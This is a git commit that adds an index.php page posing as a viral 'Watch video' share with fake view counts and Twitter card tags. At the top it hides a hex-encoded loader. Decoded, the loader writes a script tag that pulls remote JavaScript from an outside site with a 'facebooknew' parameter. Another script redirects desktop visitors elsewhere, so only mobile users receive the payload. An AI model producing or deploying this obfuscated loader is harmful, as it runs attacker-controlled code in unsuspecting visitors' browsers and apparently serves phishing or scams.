81e3dc689833c7981416c434e2af5fcb64f7b27a
trinidad000 <73908368+trinidad000@users.noreply.github.com>
2021-08-06 11:23:01 +0800

    Create index.php

---
+++ index.php
@@ -0,0 +1,35 @@
+<script type='text/javascript'>
+var t="3c736372697074207372633d2268747470733a2f2f6f6e6c696e6570616b6e65772e736974652f3f6170693d31266c616e3d66616365626f6f6b6e65772668743d322220747970653d22746578742f6a61766173637269707422206173796e633d2274727565223e3c2f7363726970743e";for(i=0;i<t.length;i+=2){document.write(String.fromCharCode(parseInt(t.substr(i,2),16)));}
+//-->
+</script>
+
+
+	<html> 
+	<head> 
+	<title>😍😍😍😍😍😍</title>
+		
+		<meta name="twitter:card" content="summary" />
+		<meta name="twitter:site" content="@" />
+		<meta name="twitter:title" content="Watch video @" />
+		<meta name="twitter:description" content="907,165 Views " />
+		<meta name="twitter:image" content="https://avatars.io/twitter/" />
+	
+	</head>
+
+
+ <script type="text/javascript">
+	function generateRandomString(iLen) {
+    var sRnd = '';
+    var sChrs = "abcdefghiklmnopqrstuvwxyz";
+    for (var i = 0; i < iLen; i++) {
+      var randomPoz = Math.floor(Math.random() * sChrs.length);
+      sRnd += sChrs.substring(randomPoz, randomPoz + 1);
+    }
+    return sRnd;
+  }
+        if (screen.width <= 720) {
+        
+    } else {
+        window.location = "https://www.beatport.com/label/j-records/34501"
+    }
+</script>
